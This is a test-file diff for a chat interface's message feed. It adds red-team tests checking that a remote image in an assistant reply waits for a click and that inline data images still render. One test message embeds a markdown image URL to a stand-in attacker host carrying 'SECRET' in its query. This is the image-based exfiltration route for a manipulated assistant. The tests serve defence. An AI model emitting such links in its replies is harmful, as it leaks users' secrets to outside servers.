@@ -118,3 +118,32 @@ describe('MessageFeed reactions', () => {
     expect(src).toContain('setPickerOpen(true), 450')
   })
 })
+
+describe('remote images in replies wait for a click (red-team)', () => {
+  const base = {
+    thinking: null, tool_calls: [], tool_results: [], model: null, agent: null, tokens: null,
+    created_at: '2026-11-15T06:00:00Z', reverted: false,
+  }
+  it('does not paint an internet image in an assistant reply', async () => {
+    const { createElement } = await import('react')
+    const { renderToStaticMarkup } = await import('react-dom/server')
+    const { MessageFeed } = await import('./MessageFeed')
+    const msg = { ...base, id: 'r1', role: 'assistant' as const, content: 'Done ![chart](https://attacker.example/leak?q=SECRET)' }
+    const html = renderToStaticMarkup(
+      createElement(MessageFeed, { messages: [msg], partialText: '', streaming: false, loading: false } as never),
+    )
+    expect(html).toContain('data-testid="remote-image-gate"')
+    expect(html).toContain('attacker.example')
+    expect(html).not.toMatch(/<img[^>]+attacker\.example/)
+  })
+  it('still paints inline data images', async () => {
+    const { createElement } = await import('react')
+    const { renderToStaticMarkup } = await import('react-dom/server')
+    const { MessageFeed } = await import('./MessageFeed')
+    const msg = { ...base, id: 'r2', role: 'assistant' as const, content: 'Here ![dot](data:image/png;base64,iVBORw0KGgo=)' }
+    const html = renderToStaticMarkup(
+      createElement(MessageFeed, { messages: [msg], partialText: '', streaming: false, loading: false } as never),
+    )
+    expect(html).not.toContain('remote-image-gate')
+  })
+})
